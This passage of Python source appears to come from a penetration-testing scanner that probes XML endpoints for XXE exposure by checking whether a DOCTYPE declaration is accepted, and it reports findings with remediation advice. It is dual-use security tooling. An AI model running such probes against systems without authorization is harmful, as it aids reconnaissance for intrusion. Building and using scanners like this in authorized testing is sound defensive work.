                    continue
                _, benign_status = benign_result
                # Skip paths that don't accept XML POST
                if benign_status in (0, 404, 405, 501, 503):
                    break
                benign_body = benign_result[0].lower()
                if benign_body.lstrip().startswith(
                    ("<!doctype html", "<html", "<!--"),
                ):
                    break

                doctype_result = await self._post_xml(
                    ctx, f"{base_url}{path}", doctype_xml, ct,
                )
                if doctype_result is None:
                    continue
                doctype_body, doctype_status = doctype_result

                if (
                    benign_status == 200
                    and doctype_status == 200
                    and not any(
                        err in doctype_body.lower()
                        for err in ("doctype", "not allowed", "entity", "dtd")
                    )
                ):
                    tested.append({
                        "path": path, "content_type": ct,
                        "label": "doctype_accepted", "confirmed": False,
                    })
                    findings.append(Finding.medium(
                        f"XML endpoint accepts DOCTYPE: {path}",
                        description=(
                            "Endpoint accepts XML with DOCTYPE declaration "
                            "without error. This is a precondition for XXE. "
                            "Blind XXE may be possible via OOB exfiltration."
                        ),
                        evidence=(
                            f"URL: {base_url}{path}\n"
                            f"Content-Type: {ct}\n"
                            f"Benign XML: status {benign_status}\n"
                            f"DOCTYPE XML: status {doctype_status}"
                        ),
                        remediation=(
                            "Disable DOCTYPE processing in XML parsers. "
                            "Use defusedxml (Python), "
                            "setFeature(DISALLOW_DOCTYPE, true) (Java), "
                            "or libxml_disable_entity_loader (PHP)."
                        ),
                        tags=["pentesting", "xxe", "doctype"],
                    ))
                    return
